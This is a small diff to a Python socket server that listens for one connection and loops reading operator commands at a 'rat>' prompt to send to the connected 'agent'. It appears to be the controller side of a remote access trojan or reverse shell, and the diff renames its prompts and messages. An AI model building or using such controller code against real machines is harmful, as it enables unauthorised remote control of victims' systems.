@@ -10,13 +10,13 @@ ip_server = os.getenv('IP_SERVER')
 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server_socket.bind((ip_server, SERVER_PORT))
 server_socket.listen(1)
-print(f"[*] En écoute sur {ip_server}:{SERVER_PORT}")
+print(f"[*] Listening on {SERVER_PORT}...")
 
 client_socket, client_address = server_socket.accept()
-print(f"[+] Connection de {client_address}")
+print("[+] Agent received !")
 
 while True:
-    command = input("Shell> ")
+    command = input("rat> ")
     if command.lower() == 'exit':
         client_socket.send(b'exit')
         break
